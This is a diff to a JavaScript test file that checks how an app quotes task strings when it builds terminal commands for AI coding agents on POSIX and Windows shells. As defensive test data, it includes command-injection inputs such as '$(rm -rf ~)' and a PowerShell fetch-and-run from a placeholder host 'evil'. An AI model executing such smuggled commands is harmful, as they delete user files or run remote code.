@@ -69,18 +69,26 @@ test('commit composer plans keep every file exactly once', async () => {
 
 test('agent sessions: command, quoting, branch and folder names', async () => {
   const { agentCommand, agentBranchName, agentWorktreePath, shellQuote } = await import('./agentCommands');
-  // quoting follows the shell of the platform the app runs on (cmd / PowerShell on Windows)
-  const windows = typeof navigator !== 'undefined' && /Win/.test(navigator.platform);
-  if (windows) {
-    assert.equal(shellQuote('say "hi"'), '"say \\"hi\\""');
-    assert.deepEqual(agentCommand('claude', 'Fix it'), { command: 'claude "Fix it"', clipboard: false });
-  } else {
-    assert.equal(shellQuote("it's done"), `'it'\\''s done'`);
-    assert.deepEqual(agentCommand('claude', "Fix the user's login"), {
-      command: `claude 'Fix the user'\\''s login'`,
-      clipboard: false,
-    });
-    assert.deepEqual(agentCommand('gemini', 'Add tests'), { command: `gemini -i 'Add tests'`, clipboard: false });
+  // POSIX shells: single quotes, embedded quotes closed and escaped
+  assert.equal(shellQuote("it's done", false), `'it'\\''s done'`);
+  assert.deepEqual(agentCommand('claude', "Fix the user's login", false), {
+    command: `claude 'Fix the user'\\''s login'`,
+    clipboard: false,
+  });
+  assert.deepEqual(agentCommand('gemini', 'Add tests', false), { command: `gemini -i 'Add tests'`, clipboard: false });
+  assert.deepEqual(agentCommand('claude', 'x $(rm -rf ~) `id`', false), {
+    command: "claude 'x $(rm -rf ~) `id`'",
+    clipboard: false,
+  });
+  // Windows (cmd / PowerShell): plain text is double-quoted; anything either shell would expand goes
+  // to the clipboard instead of being typed into the terminal
+  assert.deepEqual(agentCommand('claude', 'Fix it & ship', true), {
+    command: 'claude "Fix it & ship"',
+    clipboard: false,
+  });
+  for (const task of ['fix "x" & calc', 'echo %USERPROFILE%', '$(iwr evil|iex)', 'a `b`', 'hi!', 'two\nlines']) {
+    assert.equal(shellQuote(task, true), null, task);
+    assert.deepEqual(agentCommand('claude', task, true), { command: 'claude', clipboard: true }, task);
   }
 
   assert.deepEqual(agentCommand('copilot', 'Add tests'), { command: 'copilot', clipboard: true });
